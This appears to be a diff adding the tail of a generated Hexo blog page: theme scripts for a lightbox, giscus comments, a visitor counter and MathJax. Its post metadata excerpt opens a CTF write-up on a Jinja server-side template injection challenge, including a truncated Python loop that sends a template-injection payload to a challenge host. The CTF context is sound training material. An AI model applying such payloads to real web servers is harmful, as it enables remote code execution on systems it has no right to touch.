+          excerpt: "",
+          description: "",
+          stripContent: "锦家有什么（ssti漏洞） 锦家-&amp;gt;jinjia,猜测可能是有ssti漏洞 使用比较常见的参数?name&amp;#x3D;49,确定有ssti漏洞 用脚本看一下os._wrap_close在哪个位置-&amp;gt;154  123456import requestsfor i in range(500):    url=&amp;quot;http://node1.anna.nssctf.cn:23158/try_a_try?name=&amp;#123;&amp;#123;%27%27.__class__.__base__",
+          date: "Wed Mar 11 2026 17:21:46 GMT+0800",
+          updated: "Sat Mar 14 2026 21:06:25 GMT+0800",
+          cover: "/images/cc.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["giscus"];
+  var commentConfig = {
+    
+    
+    
+    
+    
+    giscus: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.giscus-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        // 删除可能已存在的 giscus 脚本和 iframe
+        const existingScript = container.querySelector('script[src*="giscus.app/client.js"]');
+        if (existingScript) existingScript.remove();
+        const existingFrame = document.querySelector('iframe.giscus-frame');
+        if (existingFrame) existingFrame.remove();
+
+        const giscusScript = document.createElement('script');
+        const domMode = document.documentElement.getAttribute("data-theme");
+
+        const docLang = document.documentElement.lang || 'en';
+        const langBase = docLang.split('-')[0];
+        const supportedLangs = ['ar', 'be', 'bg', 'ca', 'cs', 'da', 'de', 'en', 
+        'eo', 'es', 'eu', 'fa', 'fr', 'gr', 'hbs', 'he', 'hu', 'id', 'it', 'ja', 
+        'kh', 'ko', 'nl', 'pl', 'pt', 'ro', 'ru', 'th', 'tr', 'uk', 'uz', 'vi', 'zh-CN', 'zh-HK', 'zh-TW'];
+        const giscusLang = supportedLangs.includes(docLang) ? docLang : supportedLangs.includes(langBase) ? langBase : 'en';
+
+        giscusScript.src = 'https://giscus.app/client.js';
+        giscusScript.setAttribute('data-repo', '');
+        giscusScript.setAttribute('data-repo-id', '');
+        giscusScript.setAttribute('data-category', ''); 
+        giscusScript.setAttribute('data-category-id', '');
+        giscusScript.setAttribute('data-mapping', '0');
+        giscusScript.setAttribute('data-strict', '0');
+        giscusScript.setAttribute('data-reactions-enabled', '1');
+        giscusScript.setAttribute('data-emit-metadata', '0');
+        giscusScript.setAttribute('data-input-position', 'bottom');
+        giscusScript.setAttribute('data-theme', domMode === 'dark' ? 'dark' : 'light');
+        giscusScript.setAttribute('data-lang', giscusLang);
+        giscusScript.setAttribute('crossorigin', 'anonymous');
+        giscusScript.async = true;
+        container.appendChild(giscusScript);
+        document.body.addEventListener('light-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'light' } } }, 'https://giscus.app');
+        });
+        document.body.addEventListener('dark-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'dark' } } }, 'https://giscus.app');
+        });
+      }
+    }
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.2' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha384-Wuix6BuhrWbjDBs24bXrjf4ZQ5aFeFWBuKkFekO2t8xFU0iNaLQfp2K6&#x2F;1Nxveei" crossorigin="anonymous" defer data-pjax></script>
+
+    <script data-pjax>
+      window.MathJax = {"tex":{"tags":"ams","useLabelIds":true,"inlineMath":[["$","$"],["\\\\(","\\\\)"]],"displayMath":[["$$","$$"],["\\\\[","\\\\]"]],"processEscapes":true,"processEnvironments":true,"autoload":{"color":[],"colorv2":["color"]},"packages":{"[+]":["noerrors"]}},"options":{"skipHtmlTags":["script","noscript","style","textarea","pre","code"],"ignoreHtmlClass":"tex2jax_ignore","processHtmlClass":"tex2jax_process"},"loader":{"load":["input/asciimath","[tex]/noerrors"]}};
+    </script>
+  
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
